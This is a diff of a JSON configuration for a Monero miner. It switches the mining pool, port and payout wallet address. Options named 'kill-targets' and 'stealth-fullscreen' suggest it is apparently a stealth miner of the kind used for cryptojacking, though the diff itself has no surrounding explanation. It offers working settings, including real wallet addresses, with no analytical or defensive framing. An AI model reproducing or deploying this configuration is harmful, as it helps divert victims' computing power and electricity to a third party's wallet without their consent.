@@ -1,8 +1,8 @@
 {
     "algo": "rx/0",
-    "pool": "xmr-asia1.nanopool.org",
-    "port": 10343,
-    "wallet": "44SC1Wk3tmZeVr6LvcaVcsZbnYCT5hUVWe4ptAPE445NWhcYUvkShPuJiYkxi5yofgdTWqPUCCNdcBar18Kecbgs15gRzhk",
+    "pool": "pool.hashvault.pro",
+    "port": 443,
+    "wallet": "41kG9fPsM2TBSbPaXhJ8bjgoeup4YyQoqM4rR6gzFHWXGiGgaW5QdJLE4wH7MGB11PgoPzs5NrBXvYCaiLUEyJjVN8HSJny",
     "password": "",
     "nicehash": false,
     "ssltls": true,
@@ -13,6 +13,7 @@
     "kill-targets": "",
     "stealth-fullscreen": false
 }
+
 
 
 
